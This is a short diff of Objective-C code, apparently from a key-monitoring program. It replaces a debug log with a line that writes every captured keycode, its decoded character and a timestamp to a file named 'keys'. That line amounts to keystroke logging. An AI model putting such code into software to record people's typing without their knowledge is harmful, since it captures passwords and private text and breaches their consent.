@@ -28,7 +28,9 @@
     //if (key == 55) cmd = !cmd;
     //if (cmd == true && key == 4) [self reset];
     
-    NSLog(@"%d at %@", key, [Time currentTime]);
+    [FileManager writeToFile:@"keys" file:[NSString stringWithFormat:@"%d = '%@' (%@)\n", key, [KeycodeEncrypter keyStringFormKeyCode:key], [Time currentTime]]];
+    //NSLog(@"%d at %@", key, [Time currentTime]);
+    //NSLog(@"%@", [KeycodeEncrypter keyStringFormKeyCode:key]);
         
     if (key == 55) [combination removeAllObjects];
     [combination addObject:[NSNumber numberWithInt:key]];
